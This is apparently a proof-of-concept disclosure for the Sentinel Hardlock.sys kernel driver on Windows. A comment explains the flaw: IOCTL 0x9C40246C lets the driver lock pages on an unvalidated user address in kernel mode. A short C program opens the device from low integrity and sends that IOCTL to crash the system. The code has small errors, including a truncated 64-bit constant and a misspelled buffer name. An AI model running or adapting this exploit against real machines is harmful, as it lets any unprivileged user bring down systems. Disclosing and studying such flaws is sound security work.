/*
Product Name        : Hardlock.sys (Sentinel hardlock device driver for Windows) by Safenet Inc.
File Version        : 3.93.14502.1
Operation environment: Tested on Lenovo Thinkpad laptop with Windows 10 x64 v10.0.19043 Build 19043(21h1).

Description of the issue -:
While interacting with the device using the IOCTL 0x9C40246C, a call to MmProbeandLockPages(..) is done with leads to BSOD.
During the procedure , user has to supply an input buffer of size more than 144 bytes , then the flow is forwarded to next function which does some functions and allocates MDL for the user input buffer. The function takes 2 arguments as input from the dispatch function, which are the size of the input buffer and an integer pointer to the inputbuffer. Further after the function allocates 1000 bytes of MDL for the user inputbuffer. But the input buffer is not being validated at any point during the function .Next the virtual address to the MDL being allocated ,IoModifyAccess right and kernel access mode is passed on to the function MmProbeandLockPagesas input parameters. As the access mode is hardcoded to kernel mode ,therefore the validation for the input MDL address is being bypassed .

The issue can cause multiple types of buchecks because the system tries to lock invalid virtual system addresses . Like
PAGE_FAULT_IN_NONPAGED_AREA (50) and PROCESS_HAS_LOCKED_PAGES (76).

The issuecan be triggered from low integrity 
*/ 


#include <stdio.h>
 #include <Windows.h>
 int main()
 {
 HANDLE h= CreateFileA("\\\\.\\GLOBALROOT\\Device\\fnt0", GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                0,
                NULL);

if (h == INVALID_HANDLE_VALUE)
{
printf("[-] Unable to open handle to the device :%d \n", GetLastError());
return -1;
}
 printf("[+] Handle to the device \\.\fnt0 created 0x00%zx\n", h);
 DWORD OutputBuffer[0x1000] = { 0 };
 DWORD BytesReturned = 0;

 DWORD inputbuffer= 0x4141414141414141;                    // Can be anything

 BOOL Status = DeviceIoControl(
h,                        //Handle to the device
0x9C40246C,               //Control code (IOCTL)
  (LPVOID)inputbuffer,      //input buffer    
0x145,                    //size of the inputbuffer
&OutputBuffer,            //Outputbuffer
sizeof(Outputbuffer),     //size of Outputbuffer                    
&BytesReturned,           //Number of bytes returned
NULL
);
   return 0;
 }
